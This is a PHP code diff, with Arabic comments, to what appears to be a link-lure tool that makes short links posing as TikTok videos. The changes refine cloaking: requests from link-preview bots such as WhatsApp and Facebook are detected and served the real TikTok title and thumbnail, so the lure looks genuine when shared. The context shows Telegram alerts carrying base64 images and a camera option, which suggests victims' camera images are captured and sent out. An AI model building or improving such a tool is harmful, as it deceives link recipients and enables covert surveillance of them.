@@ -60,14 +60,13 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// دالة جلب بيانات تيك توك المضمونة والمحدثة
+// دالة جلب تفاصيل تيك توك بدقة عبر TikWM API
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video - شاهد الآن', 
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800'
     ];
 
-    // محاولة أولى عبر TikWM
     $ch = curl_init("https://www.tikwm.com/api/?url=" . urlencode($url));
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, 
@@ -88,24 +87,6 @@ function fetch_tiktok_exclusive_meta($url) {
             }
         }
     }
-
-    // محاولة ثانية احتياطية عبر oEmbed الرسمي لتيك توك
-    $ch2 = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
-    curl_setopt_array($ch2, [
-        CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 5, 
-        CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)'
-    ]);
-    $res2 = curl_exec($ch2);
-    curl_close($ch2);
-
-    if ($res2) {
-        $data2 = json_decode($res2, true);
-        if (!empty($data2['title'])) $meta['title'] = $data2['title'];
-        if (!empty($data2['thumbnail_url'])) $meta['image'] = $data2['thumbnail_url'];
-    }
-
     return $meta;
 }
 
@@ -166,15 +147,16 @@ if (isset($_GET['r'])) {
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|twitterbot|discordbot|preview/i', $ua);
 
-        // هنا يتم عرض الصورة والعنوان الحقيقيين لبوت واتساب فوراً من قاعدة البيانات
+        // رد خاص ومحسّن لبوت واتساب وفيسبوك لإجبارهم على جلب الصورة والعنوان الحقيقيين
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta charset="UTF-8">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:description" content="شاهد الفيديو الحصري على تيك توك">';
+            echo '<meta property="og:description" content="TikTok Video - اضغط للمشاهدة">';
             echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:image:type" content="image/jpeg">';
             echo '<meta property="og:image:width" content="1200">';
             echo '<meta property="og:image:height" content="630">';
             echo '<meta property="og:type" content="video.other">';
@@ -324,7 +306,6 @@ if ($is_logged_in) {
         $use_camera = isset($_POST['use_camera']) ? 1 : 0;
         if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
         
-        // جلب العنوان والصورة الحقيقية وتخزينها في قاعدة البيانات فوراً
         $scraped = fetch_tiktok_exclusive_meta($target_url);
         $code = substr(md5(uniqid(rand(), true)), 0, 7);
         
